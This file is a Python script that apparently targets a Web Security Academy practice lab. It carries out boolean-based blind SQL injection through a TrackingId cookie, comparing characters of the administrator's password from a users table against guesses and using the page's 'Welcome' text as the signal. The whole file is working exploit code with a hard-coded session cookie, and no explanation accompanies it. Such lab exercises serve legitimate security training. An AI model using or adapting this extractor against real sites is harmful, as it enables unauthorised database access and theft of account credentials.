import httpx

URL = "https://0a62007603cfa662804a2b9a009600f5.web-security-academy.net/"

def inject_headers(sql):
    return {'Host': '0a62007603cfa662804a2b9a009600f5.web-security-academy.net', 
             'Cookie': f'TrackingId=cefz1GCnQ4i2Ec3T{sql}; session=FtR6HSmZl6PWjQioa9WZXYnP77pkOFq7', 'Cache-Control': 'max-age=0', 'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Linux"', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Priority': 'u=0, i'}
            

def inject_req(sql):
    headers = inject_headers(sql)

    while (True):
        try:
            with httpx.Client(headers=headers) as client:
                r = client.get(URL)
                html = r.text
                break
        except (httpx.ReadTimeout, httpx.ConnectTimeout):
            print("error, retyring...")
    return "Welcome" in html

def gt_req(i, c):
    sql = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) > '{c}"
    return inject_req(sql)

def eq_req(i, c):
    sql = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{c}"
    return inject_req(sql)